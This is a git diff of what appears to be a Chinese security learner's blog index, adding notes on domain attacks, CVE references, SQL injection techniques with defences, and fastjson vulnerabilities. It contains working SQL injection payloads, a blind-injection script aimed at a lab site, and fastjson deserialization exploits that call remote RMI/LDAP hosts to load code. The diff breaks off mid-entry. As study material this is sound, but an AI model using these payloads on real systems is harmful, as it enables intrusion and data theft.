@@ -418,7 +418,7 @@
 
 <p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
 <p><a href="https://3gstudent.github.io/">https://3gstudent.github.io/</a></p>
-<h1 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm-relay"></a>ntlm-relay</h1><h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><h3 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h3><h3 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h3><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
+<h1 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm-relay"></a>ntlm-relay</h1><h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><h3 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h3><h3 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h3><h3 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
 <h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><p>域控独特端口：ladp 389</p>
 <h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="dump-hash"><a href="#dump-hash" class="headerlink" title="dump hash"></a>dump hash</h3><ul>
 <li>需要获得以下任一用户的权限：</li>
@@ -496,8 +496,17 @@
 <p><a href="https://www.cnblogs.com/cn-gov/p/15952459.html">https://www.cnblogs.com/cn-gov/p/15952459.html</a></p>
 <h3 id="CVE-2022-0543-Redis-Lua-沙箱绕过"><a href="#CVE-2022-0543-Redis-Lua-沙箱绕过" class="headerlink" title="CVE-2022-0543   Redis Lua 沙箱绕过"></a>CVE-2022-0543   Redis Lua 沙箱绕过</h3><p>参考：</p>
 <p><a href="https://mp.weixin.qq.com/s/Q3iRoVynpkUHUDo74UnXgA">https://mp.weixin.qq.com/s/Q3iRoVynpkUHUDo74UnXgA</a></p>
+<h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><h5 id="CVE-2022-22965-Spring-Framework-RCE-Early-Announcement"><a href="#CVE-2022-22965-Spring-Framework-RCE-Early-Announcement" class="headerlink" title="CVE-2022-22965  Spring Framework RCE, Early Announcement"></a>CVE-2022-22965  Spring Framework RCE, Early Announcement</h5><p><a href="https://blog.csdn.net/weixin_45794666/article/details/123918066">(28条消息) Spring Framework RCE(CVE-2022-22965)_6right的博客-CSDN博客</a></p>
+<h5 id="CVE-2022-22947-Spring-Cloud-Gateway"><a href="#CVE-2022-22947-Spring-Cloud-Gateway" class="headerlink" title="CVE-2022-22947   Spring Cloud Gateway"></a>CVE-2022-22947   Spring Cloud Gateway</h5><p><a href="https://www.cnblogs.com/syroot/p/15978762.html">Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947） - 三亿人 - 博客园 (cnblogs.com)</a></p>
+<h3 id="Structs2"><a href="#Structs2" class="headerlink" title="Structs2"></a>Structs2</h3><h5 id="Structs2-026-RCE"><a href="#Structs2-026-RCE" class="headerlink" title="Structs2-026 RCE"></a>Structs2-026 RCE</h5><p>新出的 ，CVE-2021-31805</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Struts 2.0.0-2.5.29</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a href="https://mp.weixin.qq.com/s/B17fFD3xDYvNib6LhUS9dA">https://mp.weixin.qq.com/s/B17fFD3xDYvNib6LhUS9dA</a></p>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="CVE-2022-0847-Linux-本地内核提权漏洞"><a href="#CVE-2022-0847-Linux-本地内核提权漏洞" class="headerlink" title="CVE-2022-0847 Linux 本地内核提权漏洞"></a>CVE-2022-0847 Linux 本地内核提权漏洞</h3><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p>堪称新版脏牛。Dirty Pipe</p>
-<p>允许非特权用户注入和覆盖任意只读文件中的数据，导致权限提升，并最终获得root权限。</p>
+<p>该漏洞源于新管道缓冲区结构的“flag”变量在 Linux 内核中的 copy_page_to_iter_pipe 和 push_pipe 函数中缺乏正确初始化。非特权本地用户利用该漏洞可以提升权限至root。</p>
+<p>允许非特权用户注入和覆盖任意只读文件中的数据，非特权用户通过替换/etc/passwd文件中root用户的hash值达到权限提升的目的。</p>
 <p>exp 链接：<a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a></p>
 <h5 id="适用范围："><a href="#适用范围：" class="headerlink" title="适用范围："></a>适用范围：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux Kernel版本 &gt;&#x3D; 5.8</span><br><span class="line"></span><br><span class="line">Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102 </span><br></pre></td></tr></table></figure>
 
@@ -509,7 +518,12 @@
 <p>原理：<a href="https://mp.weixin.qq.com/s/cHuO8TO4IvGgslvipJGQ2A">漏洞通告：CVE-2022-0847linux内核提权漏洞复现/原理讲解 (qq.com)</a></p>
 <p><a href="https://www.freebuf.com/company-information/324470.html">https://www.freebuf.com/company-information/324470.html</a></p>
 <p><a href="https://zone.huoxian.cn/d/978-cve-2022-0847-dirtypipe-linux">CVE-2022-0847_DirtyPipe Linux 内核提权漏洞分析及复现 - 火线 Zone-云安全社区 (huoxian.cn)</a></p>
-<h3 id="CVE-2020-1337"><a href="#CVE-2020-1337" class="headerlink" title="CVE-2020-1337"></a>CVE-2020-1337</h3><h3 id="CVE-2020–1030"><a href="#CVE-2020–1030" class="headerlink" title="CVE-2020–1030"></a>CVE-2020–1030</h3><h3 id="CVE-2020–1048"><a href="#CVE-2020–1048" class="headerlink" title="CVE-2020–1048"></a>CVE-2020–1048</h3><h3 id="CVE-2022-21999-打印机提权漏洞"><a href="#CVE-2022-21999-打印机提权漏洞" class="headerlink" title="CVE-2022-21999  打印机提权漏洞"></a>CVE-2022-21999  打印机提权漏洞</h3><p>参考：</p>
+<h3 id="打印机提权漏洞"><a href="#打印机提权漏洞" class="headerlink" title="打印机提权漏洞"></a>打印机提权漏洞</h3><p>CVE-2020-1337</p>
+<p>CVE-2020–1030 </p>
+<p>CVE-2020–1048</p>
+<p>CVE-2022-21999  打印机提权漏洞  </p>
+<p>环境原因没有复现成功</p>
+<p>参考：</p>
 <p>原理：<a href="https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81">https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81</a></p>
 <p>poc：<a href="https://github.com/ly4k/SpoolFool">https://github.com/ly4k/SpoolFool</a></p>
 ]]></content>
@@ -736,11 +750,12 @@
 <h3 id="简单实例应用路由调用控制器"><a href="#简单实例应用路由调用控制器" class="headerlink" title="简单实例应用路由调用控制器"></a>简单实例应用路由调用控制器</h3><ul>
 <li></li>
 </ul>
+<p>这边不知道为啥环境有问题，，，，一直报错。</p>
 <p>参考:</p>
 <p><a href="https://cloud.tencent.com/developer/article/1723191">https://cloud.tencent.com/developer/article/1723191</a>      Laravel框架分析</p>
 <p><a href="https://mp.weixin.qq.com/s/aFGw2fPgjoSTD6zK_j-oHA">https://mp.weixin.qq.com/s/aFGw2fPgjoSTD6zK_j-oHA</a>    零基础学习laravel8 </p>
 <p><a href="https://blog.csdn.net/wjcms/article/details/109016643">https://blog.csdn.net/wjcms/article/details/109016643</a>   laravel8更新之路由调整</p>
-]]></content>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>]]></content>
       <categories>
         <category>php</category>
       </categories>
@@ -893,6 +908,17 @@
 <p>注意闭合。</p>
 <p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/Snipaste_2021-02-05_23-51-46.png" alt="Snipaste_2021-02-05_23-41-35"></p>
 <p>我们同样发现报错的PATH，其余和上面同理</p>
+<p>其他报错注入函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
 <h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>服务器对我们的输入错误并没有很明显的报错回显。</p>
 <h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>布尔盲注：  页面只会显示true和false。</p>
 <p>时间盲注 ： 如果页面无论输入什么页面都正常显示，但当我们加入例如 sleep(4),页面延迟4秒，页面即存在时间盲注。</p>
@@ -910,9 +936,12 @@
 <p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/%E7%9B%B21.png" alt="盲1"></p>
 <p>不会吧，不会吧，还有人不会写python盲注脚本吧，额好像在说我i</p>
 <p>下面是 学习的脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment">#bool盲注,二分盲注</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://injectx1.lab.aqlab.cn:81/Pass-10/index.php&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdatabase</span>():</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    database = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">        mid = (<span class="built_in">min</span>+<span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">max</span>&gt;<span class="built_in">min</span>:</span><br><span class="line">            payload = <span class="string">&quot;?id=1 and ascii(substr(database(),%d,1))&gt;%d&quot;</span> % (i,mid)    </span><br><span class="line">            <span class="comment">#数据库的第一位ascii值 &gt;mid  =&gt; 我们要使用&gt;%d,不然你下面if,else就要改</span></span><br><span class="line">            url1=url+payload</span><br><span class="line">            <span class="comment">#print(url1)</span></span><br><span class="line">            req=requests.get(url1,timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;No results found&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                <span class="built_in">max</span> = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">min</span> = mid+<span class="number">1</span></span><br><span class="line">            mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid&lt;=<span class="number">32</span> <span class="keyword">or</span> mid&gt;=<span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        database +=<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;database =&gt;&quot;</span>+database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getdatabase()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment">#bool盲注,二分盲注</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://injectx1.lab.aqlab.cn:81/Pass-10/index.php&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdatabase</span>():</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    database = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">        mid = (<span class="built_in">min</span>+<span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">max</span>&gt;<span class="built_in">min</span>:</span><br><span class="line">            payload = <span class="string">&quot;?id=1 and ascii(substr(database(),%d,1))&gt;%d&quot;</span> % (i,mid)    </span><br><span class="line">            <span class="comment">#数据库的第一位ascii值 &gt;mid  =&gt; 我们要使用&gt;%d,不然你下面if,else就要改</span></span><br><span class="line">            url1=url+payload</span><br><span class="line">            <span class="comment">#print(url1)</span></span><br><span class="line">            req=requests.get(url1,timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;No results found&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                <span class="built_in">max</span> = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">min</span> = mid+<span class="number">1</span></span><br><span class="line">            mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid&lt;=<span class="number">32</span> <span class="keyword">or</span> mid&gt;=<span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        database +=<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;database =&gt;&quot;</span>+database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getdatabase()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
+
+<p>其他利用方式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and IFNULL((substr((select user()),1,1)&#x3D;&#39;r&#39;),0) -- +</span><br><span class="line">#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and strcmp((substr((select user()),1,1)&#x3D;&#39;r&#39;),1) -- +</span><br><span class="line">#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1</span><br></pre></td></tr></table></figure>
 
 
 
@@ -932,7 +961,70 @@
 
 
 
-<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p><a href="https://blog.csdn.net/weixin_45345384/article/details/120888172">https://blog.csdn.net/weixin_45345384/article/details/120888172</a></p>
+<p>tips：</p>
+<p>盲注五种方法：sleep()，benchmark(t,exp)，笛卡尔积，GET_LOCK() RLIKE正则</p>
+<p>提高盲注效率：二分法，位运算法</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>PHP发送请求到mysql时经过一次<code>gbk</code>编码，PHP会将获取到的数据进行<code>魔术引号</code>的处理，因为GBK是双字节编码，所以我们提交的<code>%df</code>这个字符和转译的反斜杠组成了新的汉字，然后数据库处理的时候是根据GBK去处理的，然后<code>单引号就逃逸了出来</code>，进行闭合</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&#39;   -&gt;\&#39;</span><br><span class="line"></span><br><span class="line">\ -&gt; %5c</span><br><span class="line"></span><br><span class="line">输入：%df&#39; -&gt; %df\&#39; -&gt;運&#39;</span><br><span class="line"></span><br><span class="line">%df%5c -&gt; 汉字</span><br></pre></td></tr></table></figure>
+
+<p>利用:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1%df&#39; union select 1,2,3 -- qwe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>魔术引号PHP5.3.0后就被废除，5.4.0后就被移除。（但可能会有人写魔术引号函数进来利用）.</p>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">插入恶意数据</span><br><span class="line">引用恶意数据</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/webp.webp" alt="img"></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h3 id><a href="#" class="headerlink" title></a></h3><p><a href="https://blog.csdn.net/weixin_45345384/article/details/120888172">https://blog.csdn.net/weixin_45345384/article/details/120888172</a></p>
+<ul>
+<li>预编译</li>
+<li>PDO</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">模拟预处理的方式是在客户端本地执行预处理的模拟，最终将拼好的sql语句发送到mysql服务器进行执行(实际上就是完成了字符串拼接</span><br><span class="line"></span><br><span class="line">本地预处理方式则是分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器</span><br><span class="line">然后就可以多次发送占位符参数给mysql服务器进行执行(多次执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>防止了sql语句的拼接</p>
+<ul>
+<li>正则规则</li>
+</ul>
+<h1 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h1><h3 id="脚本语言-数据库"><a href="#脚本语言-数据库" class="headerlink" title="脚本语言+数据库"></a>脚本语言+数据库</h3><p>常用搭配：</p>
+<table>
+<thead>
+<tr>
+<th>PHP</th>
+<th>MYSQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>asp</td>
+<td>access/mssql</td>
+</tr>
+<tr>
+<td>asp.net(aspx)</td>
+<td>msssql</td>
+</tr>
+<tr>
+<td>java  (jsp)</td>
+<td>oracle</td>
+</tr>
+</tbody></table>
+<h3 id="数据库特性"><a href="#数据库特性" class="headerlink" title="数据库特性"></a>数据库特性</h3><ol>
+<li>注释符</li>
+</ol>
+<p>mysql: <code>/*</code></p>
+<p>Oracle和Mssql：<code>--</code></p>
+<p>子句查询标识符：<code>; </code>     (Oracle不支持多行，如果错误，可能是Oracle数据库)</p>
+<ol start="2">
+<li>函数</li>
+</ol>
+<p><code>and (select count(*)from MSysAccessObjects)&gt;0 </code>   access数据库<br>        <code>    and (select count(*)from sysobjects)&gt;0</code>返回正常说明是mssql数据库and                 <code>     length(user0)&gt;10</code>返回正常说明是 Mysql<br>Oracle  可以根据from dual 虚拟库判断<br>    <code>select extract(dow from now)) . select version) --</code>     Postgresql </p>
+<p>参考5号mo区</p>
+<p>总参考：</p>
+<p><a href="https://mp.weixin.qq.com/s/xz4qtjgLDuozyv9IYMwbLA">https://mp.weixin.qq.com/s/xz4qtjgLDuozyv9IYMwbLA</a></p>
 ]]></content>
       <categories>
         <category>常见数据库注入</category>
@@ -976,6 +1068,83 @@
       </categories>
       <tags>
         <tag>VNCTF2021-web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fastjson漏洞</title>
+    <url>/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>fastjson是alibaba开源的一个json解析库，将java对象和JSON格式字符相互转换。 </p>
+<p>jackson也有这样类似功能。Spring MVC 默认采用Jackson解析Json</p>
+<p><a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
+<h3 id="原理解释："><a href="#原理解释：" class="headerlink" title="原理解释："></a>原理解释：</h3><p>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从</p>
+<p>而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据</p>
+<p>这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。</p>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>配置环境配了两个小时。。。各种报错</p>
+<p>maven环境：<a href="http://maven.apache.org/download.cgi">http://maven.apache.org/download.cgi</a></p>
+<p>idea 创建maven 项目</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pom.xml引入fastjson依赖</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.62&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后处理各种报错</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pom.xml 加入</span><br><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;defaultGoal&gt;compile&lt;&#x2F;defaultGoal&gt;.</span><br><span class="line">&lt;&#x2F;build&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后配置tomcat:<a href="https://tomcat.apache.org/download-90.cgi">Apache Tomcat® - Apache Tomcat 9 Software Downloads</a></p>
+<p>Edit Configurations 配置：</p>
+<p><img src="/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/image-20220417224659876.png" alt="image-20220417224659876"></p>
+<p>然后配置Project Structure ：<a href="https://blog.csdn.net/weixin_44579869/article/details/121647812">(28条消息) IDEA出现Please,configure Web Facet first的解决方式，或者是Servlet启动后 404_扶她小藜的博客-CSDN博客_idea please</a></p>
+<p>参考：<a href="https://blog.csdn.net/lchmyhua88/article/details/116535988">(28条消息) 在IDEA中创建maven项目，使用Fastjson 介绍json转换_华大哥的博客-CSDN博客_fastjson idea</a></p>
+<p>复现log4j2 的时候也用到了下面两个请求方式</p>
+<h3 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h3><h3 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h3><h1 id="Fastjson-多版本payload集合"><a href="#Fastjson-多版本payload集合" class="headerlink" title="Fastjson 多版本payload集合"></a>Fastjson 多版本payload集合</h1><p>copy的零组文库</p>
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://x.x.x.x:1099/jndi&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://x.x.x.x:1098/jndi&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="attr">&quot;properties&quot;</span>:&#123;<span class="attr">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://x.x.x.x:1999/Exploit&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p>
